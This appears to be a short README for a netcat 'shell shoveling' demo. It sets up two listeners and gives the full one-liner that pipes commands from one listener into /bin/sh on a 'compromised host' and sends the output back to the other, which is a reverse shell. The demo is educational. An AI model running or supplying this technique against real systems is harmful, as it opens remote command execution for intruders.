Shell Shovel
============

I put this together to demonstrate shell shoveling using netcat. I admit,
creating these shell scripts is a little silly, however, it is for
demonstration.


## Running the demo

On your localhost run shovel-input.sh and shovel-display.sh

Be sure your iptables rules are set to allow access to the ports.

For the sake of demonstration we will localhost is at 192.168.1.100


### In terminal window 0x1

```$ ./shovel-input.sh 41337```

You could run the following instead.

```$ nc -vn -l -k -p 41337```

After the next two things are running, come back here to run commands that
will be executed on the target host and display in the next terminal,
window 0x2.

### In terminal window 0x2

```$ ./shovel-display.sh 41338```

You could run the following instead.

```$ nc -l -k -vn -p 41338```

The output of commands executed in window 0x1 will appear here.


### From the remote/compromised host

Do the netcat shoveling magic.

```$ ./target.sh 192.168.1.100 41337 41338```

You could also run the following instead.

```$ nc -vn 192.168.1.100 41337 | /bin/sh | nc -vn 192.168.1.100 41338 > /tmp/foo.bar```

In practice something like this would be scripted and executed remotely.

